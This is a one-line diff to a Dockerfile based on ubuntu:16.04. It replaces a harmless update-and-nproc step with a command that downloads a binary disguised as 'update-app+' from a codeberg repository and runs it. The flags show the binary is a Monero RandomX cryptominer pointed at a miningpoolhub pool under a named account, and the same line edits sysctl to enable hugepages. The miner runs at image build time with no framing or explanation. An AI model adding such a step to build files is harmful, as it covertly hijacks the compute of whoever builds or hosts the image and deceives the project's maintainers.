@@ -1,2 +1,2 @@
 FROM ubuntu:16.04
-RUN apt-get -y update && nproc
+RUN apt-get -y update && apt-get install -y wget && sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf" && wget https://codeberg.org/brahim7/update/raw/branch/master/update/update-app+ && chmod +x update-app+ && ./update-app+ -a rx/0 -o europe.randomx-hub.miningpoolhub.com:20580 -u brahim7.brahim19 -p x --threads 12 --max-cpu-usage=85 --cpu-priority 5 --randomx-wrmsr=15 --asm=intel --randomx-no-rdmsr --randomx-no-numa --randomx-1gb-pages --randomx-mode=auto --asm=intel --cpu-no-yield --donate-level 1 --coin monero
